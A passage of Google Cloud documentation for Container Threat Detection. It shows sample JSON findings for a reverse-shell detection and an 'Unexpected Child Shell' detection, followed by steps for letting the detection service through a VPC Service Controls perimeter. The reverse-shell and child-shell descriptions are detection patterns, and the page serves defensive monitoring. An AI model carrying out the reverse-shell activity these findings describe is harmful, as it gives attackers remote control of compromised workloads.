          "KUBERNETES_PORT_443_TCP_ADDR\u003dIP_ADDRESS",
          "KUBERNETES_PORT_443_TCP\u003dtcp://IP_ADDRESS:PORT", "_\u003d/bin/echo"],
          "Container_Image_Uri": "CONTAINER_IMAGE_URI",
          "Process_Binary_Fullpath": "BINARY_PATH",
          "Container_Creation_Timestamp": {
            "seconds": 1.617989861E9,
            "nanos": 0.0
          },
          "Pod_Name": "POD_NAME",
          "Container_Name": "CONTAINER_NAME",
          "Process_Arguments": ["BINARY_PATH", "BINARY_NAME"],
          "Pid": 15.0,
          "Reverse_Shell_Stdin_Redirection_Dst_Port": DESTINATION_PORT,
          "Container_Image_Id": "CONTAINER_IMAGE_ID",
          "Reverse_Shell_Stdin_Redirection_Dst_Ip": "DESTINATION_IP_ADDRESS",
          "Pod_Namespace": "default",
          "VM_Instance_Name": "INSTANCE_ID",
          "Reverse_Shell_Stdin_Redirection_Src_Port": SOURCE_PORT,
          "description": "A process started with stream redirection to a remote
          connected socket. With a reverse shell, an attacker can communicate from a
          compromised workload to an attacker-controlled machine. The attacker can
          then command and control the workload to perform desired actions, for
          example as part of a botnet.",
          "Parent_Pid": 1.0,
          "Process_Creation_Timestamp": {
            "seconds": 1.61798989E9,
            "nanos": 6.16573691E8
          }
        },
        "securityMarks": {
          "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID/securityMarks"
        },
        "eventTime": "2021-04-09T17:38:10.904Z",
        "createTime": "2021-04-09T17:38:15.486Z",
        "propertyDataTypes": {
          "Container_Image_Id": {
            "primitiveDataType": "STRING"
          },
          "Container_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Pod_Namespace": {
            "primitiveDataType": "STRING"
          },
          "Environment_Variables": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Reverse_Shell_Stdin_Redirection_Dst_Ip": {
            "primitiveDataType": "STRING"
          },
          "description": {
            "primitiveDataType": "STRING"
          },
          "Process_Arguments": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Pid": {
            "primitiveDataType": "NUMBER"
          },
          "Reverse_Shell_Stdin_Redirection_Src_Ip": {
            "primitiveDataType": "STRING"
          },
          "Container_Image_Uri": {
            "primitiveDataType": "STRING"
          },
          "Reverse_Shell_Stdin_Redirection_Dst_Port": {
            "primitiveDataType": "NUMBER"
          },
          "Pod_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Reverse_Shell_Stdin_Redirection_Src_Port": {
            "primitiveDataType": "NUMBER"
          },
          "Parent_Pid": {
            "primitiveDataType": "NUMBER"
          },
          "VM_Instance_Name": {
            "primitiveDataType": "STRING"
          },
          "Container_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Binary_Fullpath": {
            "primitiveDataType": "STRING"
          }
        },
        "severity": "CRITICAL",
        "workflowState": "NEW",
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "projectName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "projectDisplayName": "PROJECT_ID",
        "parentName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parentDisplayName": "PROJECT_ID",
        "type": "google.container.Cluster"
      }
    }
      

#### Unexpected Child Shell
    
    
    {
      "finding": {
        "access": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Unexpected Child Shell",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-06-29T17:34:13.765Z",
        "database": {},
        "description": "A process should not normally create child shell processes, spawn a child shell process.",
        "eventTime": "2023-06-29T17:34:13.492Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "ns": "default",
              "name": "CONTAINER_NAME",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_URI",
                  "imageId": CONTAINER_IMAGE_ID"
                }
              ]
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER"
          ]
        },
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/home/vmagent/app/temp/dash\"",
              "size": "31376",
              "sha256": "31351885b07570f450f57bd19cf28ff4310b8774a1c2580c3c7c9e7336c8467e",
              "hashedSize": "31376",
              "partiallyHashed": false
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"./temp/dash\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-unexpected-child-shell-3f50de2ab54bac1b\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.52.113.1:443\""
              },
              {
                "name": "\"PYTHONUNBUFFERED\"",
                "val": "\"1\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.52.113.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/python3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/home/vmagent/app\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"1\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"PORT\"",
                "val": "\"8080\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.52.113.1\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.52.113.1:443\""
              },
              {
                "name": "\"_\"",
                "val": "\"./temp/dash\""
              }
            ],
            "pid": "15",
            "parentPid": "14"
          },
          {
            "binary": {
              "path": "\"/home/vmagent/app/temp/consul\"",
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"./temp/consul\""
            ],
            "argumentsTruncated": false,
            "pid": "14",
            "parentPid": "13"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "Process_Arguments": [
          "./temp/dash"
        ],
        "Pid": 15,
        "Process_Creation_Timestamp": {
          "seconds": 1688060050,
          "nanos": 207040864
        },
        "Container_Image_Uri": "CONTAINER_IMAGE_URI",
        "Process_Binary_Fullpath": "/home/vmagent/app/temp/dash",
        "VM_Instance_Name": "INSTANCE_ID",
        "Pod_Name": "POD_NAME",
        "Pod_Namespace": "default",
        "Container_Name": "CONTAINER_NAME",
        "Container_Image_Id": "CONTAINER_IMAGE_ID",
        "Container_Creation_Timestamp": {
          "seconds": 1688060050,
          "nanos": 0
        },
        "Parent_Pid": 14,
        "Environment_Variables": [
          "HOSTNAME=ktd-test-unexpected-child-shell-3f50de2ab54bac1b",
          "KUBERNETES_PORT_443_TCP_PORT=443",
          "KUBERNETES_PORT=tcp://10.52.113.1:443",
          "PYTHONUNBUFFERED=1",
          "KUBERNETES_SERVICE_PORT=443",
          "KUBERNETES_SERVICE_HOST=10.52.113.1",
          "PATH=/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/python3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
          "PWD=/home/vmagent/app",
          "LANG=C.UTF-8",
          "SHLVL=1",
          "HOME=/root",
          "KUBERNETES_PORT_443_TCP_PROTO=tcp",
          "KUBERNETES_SERVICE_PORT_HTTPS=443",
          "DEBIAN_FRONTEND=noninteractive",
          "PORT=8080",
          "KUBERNETES_PORT_443_TCP_ADDR=10.52.113.1",
          "KUBERNETES_PORT_443_TCP=tcp://10.52.113.1:443",
          "_=./temp/dash"
        ]
      }
    }
        

## Scan projects protected by a service perimeter

If you activated Security Command Center at the organization level **after December 7, 2023** and have a [service perimeter](https://docs.cloud.google.com/vpc-service-controls/docs/overview) that blocks access to certain projects and services, you must grant the service account for Container Threat Detection inbound access to that service perimeter. Otherwise, Container Threat Detection can't produce findings related to the protected projects and services.

If your cluster is within a VPC Service Controls service perimeter, make sure that `containerthreatdetection.googleapis.com`, the Container Threat Detection API, is listed as an [accessible service](https://docs.cloud.google.com/vpc-service-controls/docs/vpc-accessible-services). For more information, see [Service perimeter overview](https://docs.cloud.google.com/vpc-service-controls/docs/service-perimeters).

### Console

#### Navigate to the service perimeter

  1. In the Google Cloud console, go to the **VPC Service Controls** page.

[Go to VPC Service Controls](https://console.cloud.google.com/projectselector2/security/service-perimeter?supportedpurview=organizationId)

  2. Select your organization.
  3. In the drop-down list, select the access policy that contains the service perimeter that you want to grant access to.

The service perimeters associated with the access policy appear in the list.

  4. Click the name of the service perimeter that you want to update.

To find the service perimeter you need to modify, you can check your logs for entries that show `RESOURCES_NOT_IN_SAME_SERVICE_PERIMETER` violations. In those entries, check the `servicePerimeterName` field: 
         
         accessPolicies/ACCESS_POLICY_ID/servicePerimeters/SERVICE_PERIMETER_NAME

  5. Click edit **Edit**.



#### Add an ingress rule

  1. Click **Ingress policy**.
  2. Click **Add an ingress rule**.
  3. In the **From** section, set the following details:

     1. For **Identities > Identity**, select **Select identities & groups**.
     2. Click **Add identities**.
     3. Enter the email address that identifies the [Cloud Security Command Center Service Agent](https://docs.cloud.google.com/security-command-center/docs/access-control-org#service-agent). This address has the following format: 
            
            service-org-ORGANIZATION_ID@security-center-api.iam.gserviceaccount.com

Replace `ORGANIZATION_ID` with your organization ID.

     4. Select the service agent or press `ENTER`, and then click **Add identities**. 
  4. In the **To** section, set the following details:

     1. For **Resources > Projects**, select **All projects**.
     2. For **Operations or IAM roles** , select **All operations** , or select specific services for which VPC Service Controls violations appear. 
  5. Click **Save**.



### gcloud

**Warning:** The `--set-ingress-policies` and `--set-egress-policies` flags replace all existing ingress or egress policies in the perimeter. If you have existing policies, you must retrieve them first, add the new policy to the appropriate ingress or egress YAML file, and then run the update command. 

  1. If a quota project isn't already set, then set it. Choose a project that has the Access Context Manager API enabled. 
         
         gcloud config set billing/quota_project QUOTA_PROJECT_ID

Replace `QUOTA_PROJECT_ID` with the ID of the project that you want to use for billing and quota. 

  2. Create a file named `ingress-rule.yaml` with the following contents:
         
         - ingressFrom:
             identities:
             - serviceAccount:service-org-ORGANIZATION_ID@security-center-api.iam.gserviceaccount.com
             sources:
             - accessLevel: '*'
           ingressTo:
             operations:
             - serviceName: '*'
             resources:
             - '*'

Alternatively, you can use `operations` to specify services for which VPC Service Controls violations appear and `resources` to specify the project that appeared in the finding. 

Replace `ORGANIZATION_ID` with your organization ID.

  3. Add the ingress rule to the perimeter:
         
         gcloud access-context-manager perimeters update PERIMETER_NAME \
             --set-ingress-policies=ingress-rule.yaml

Replace the following:

     * `PERIMETER_NAME`: the name of the perimeter. For example, `accessPolicies/1234567890/servicePerimeters/example_perimeter`. 

To find the service perimeter you need to modify, you can check your logs for entries that show `RESOURCES_NOT_IN_SAME_SERVICE_PERIMETER` violations. In those entries, check the `servicePerimeterName` field: 
           
           accessPolicies/ACCESS_POLICY_ID/servicePerimeters/SERVICE_PERIMETER_NAME




For more information, see [Ingress and egress rules](https://docs.cloud.google.com/vpc-service-controls/docs/ingress-egress-rules). 

## What's next

  * Learn more about [how Container Threat Detection works](https://docs.cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview).

  * Learn how to [investigate and develop response plans](https://docs.cloud.google.com/security-command-center/docs/how-to-investigate-threats) for threats.




Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-22 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-22 UTC."],[],[]] 
